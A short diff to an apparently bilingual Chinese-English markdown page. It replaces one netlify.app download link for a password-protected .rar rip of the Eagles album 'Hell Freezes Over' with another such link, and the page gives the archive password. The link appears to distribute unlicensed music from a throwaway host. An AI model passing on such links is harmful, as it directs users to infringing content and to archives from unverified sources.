@@ -1,5 +1,5 @@
 ## 下载地址(download link)
-[下载链接 download link](https://voluble-croquembouche-d321dc.netlify.app/?s=Eagles+-+1994+-+Hell+Freezes+Over+%28XRCD+20bit%2C+2000%2C+CJVC+4908362%29.eac.ape.cover.rar)
+[下载链接 download link](https://tutu365.netlify.app/?s=Eagles+-+1994+-+Hell+Freezes+Over+%28XRCD+20bit%2C+2000%2C+CJVC+4908362%29.eac.ape.cover.rar)
 
 ## 下载密码(download password)
 1866
